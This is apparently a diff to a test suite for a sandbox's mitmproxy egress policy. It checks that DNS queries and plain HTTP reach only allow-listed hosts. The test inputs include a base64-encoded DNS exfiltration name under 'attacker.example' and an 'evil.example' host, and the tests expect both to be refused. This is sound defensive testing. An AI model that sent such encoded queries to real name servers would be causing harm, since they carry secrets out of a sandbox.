@@ -27,25 +27,29 @@ class Mode:
     def __init__(self, type_name):
         self.type_name = type_name
 class Client:
-    def __init__(self, transparent, sni):
+    def __init__(self, transparent, sni, tls=False):
         self.proxy_mode = Mode("transparent" if transparent else "regular")
         self.sni = sni
+        self.tls_established = tls
 class HTTPFlow:
-    def __init__(self, host, transparent=False, sni=None):
+    def __init__(self, host, transparent=False, sni=None, tls=False):
         self.request = Request(host)
-        self.client_conn = Client(transparent, sni)
+        self.client_conn = Client(transparent, sni, tls)
         self.response = None
 class Question:
-    def __init__(self, name):
+    def __init__(self, name, type=1):
         self.name = name
+        self.type = type
 class DnsRequest:
-    def __init__(self, name):
-        self.question = Question(name) if name else None
+    def __init__(self, name, type):
+        self.question = Question(name, type) if name else None
     def fail(self, code):
         return "failed:" + str(code)
+    def succeed(self, answers):
+        return "answered:" + ",".join(answers)
 class DnsFlow:
-    def __init__(self, name):
-        self.request = DnsRequest(name)
+    def __init__(self, name, type=1):
+        self.request = DnsRequest(name, type)
         self.response = None
 class Server:
     def __init__(self, address):
@@ -71,6 +75,11 @@ function policy(rules: object, steps: string): string {
   writeFileSync(join(root, 'mitmproxy', 'net', '__init__.py'), '')
   writeFileSync(join(root, 'mitmproxy', 'net', 'dns', '__init__.py'), '')
   writeFileSync(join(root, 'mitmproxy', 'net', 'dns', 'response_codes.py'), 'REFUSED = 5\n')
+  writeFileSync(join(root, 'mitmproxy', 'net', 'dns', 'types.py'), 'A = 1\nAAAA = 28\n')
+  writeFileSync(
+    join(root, 'mitmproxy', 'dns.py'),
+    'class ResourceRecord:\n    A = staticmethod(lambda name, ip: name + "=" + str(ip))\n    AAAA = A\n',
+  )
   const file = join(root, 'rules.json')
   writeFileSync(file, JSON.stringify({ allow: rules }))
   const script = `
@@ -90,8 +99,8 @@ def write(rules):
     tick[0] += 5
     os.utime(next, (tick[0], tick[0]))
     os.rename(next, ${JSON.stringify(file)})
-def send(host, transparent=False, sni=None):
-    flow = http.HTTPFlow(host, transparent, sni)
+def send(host, transparent=False, sni=None, tls=False):
+    flow = http.HTTPFlow(host, transparent, sni, tls)
     egress.request(flow)
     return flow
 ${steps}
@@ -166,27 +175,55 @@ describe('the egress policy of a sandbox', () => {
         'same = send("github.com", True, "github.com")',
         'print(same.request.headers["authorization"])',
         'print(send("github.com", True, "registry.npmjs.org").response)',
-        'print(send("github.com", True, None).response)',
       ].join('\n'),
     )
 
-    expect(out).toBe('Basic X\n403\n403')
+    expect(out).toBe('Basic X\n403')
   })
 
-  it('resolves only the names the rules allow, so a query cannot carry data to a name server', () => {
+  it('answers every DNS query itself and asks no name server about a name the rules do not list', () => {
     const out = policy(
       { 'github.com': {}, '*.npmjs.org': {} },
       [
-        'def ask(name):',
-        '    flow = http.DnsFlow(name)',
+        'import ipaddress, socket',
+        'asked = []',
+        'def getaddrinfo(name, port, family, kind):',
+        '    asked.append(name)',
+        '    return [(family, kind, 0, "", ("10.1.2.3", 0))]',
+        'socket.getaddrinfo = getaddrinfo',
+        'def ask(name, type=1):',
+        '    flow = http.DnsFlow(name, type)',
         '    egress.dns_request(flow)',
         '    return flow.response',
-        'print(ask("github.com"), ask("registry.npmjs.org"))',
-        'print(ask("c2VjcmV0.attacker.example"), ask(None))',
+        'print(ask("github.com"), ask("registry.npmjs.org"), ask("github.com", 16))',
+        'print(ask("c2VjcmV0.attacker.example"), ask("c2VjcmV0.attacker.example", 28), ask(None))',
+        'print(asked)',
       ].join('\n'),
     )
 
-    expect(out).toBe('None None\nfailed:5 failed:5')
+    expect(out).toBe(
+      "answered:github.com=10.1.2.3 answered:registry.npmjs.org=10.1.2.3 answered:\nfailed:5 failed:5 failed:5\n['github.com', 'registry.npmjs.org']",
+    )
+  })
+
+  it('sends plain HTTP to the name its Host header gives, which must be listed, and never to the address chosen', () => {
+    const out = policy(
+      { 'github.com': { headers: { authorization: 'Basic X' } } },
+      [
+        'plain = send("GitHub.com", True)',
+        'print(plain.request.headers["authorization"], plain.request.host)',
+        'print(send("evil.example", True).response)',
+        'print(send("github.com", True, None, True).response)',
+        'allowed = http.ConnectData(None, ("github.com", 80))',
+        'egress.server_connect(allowed)',
+        'print(allowed.server.error)',
+        'chosen = http.ConnectData(None, ("93.184.216.34", 80))',
+        'egress.server_connect(chosen)',
+        'print(chosen.server.error is not None)',
+      ].join('\n'),
+    )
+
+    expect(out).toBe('Basic X github.com\n403\n403\nNone\nTrue')
   })
 
   it('names no function after a mitmproxy event it does not mean to handle', () => {
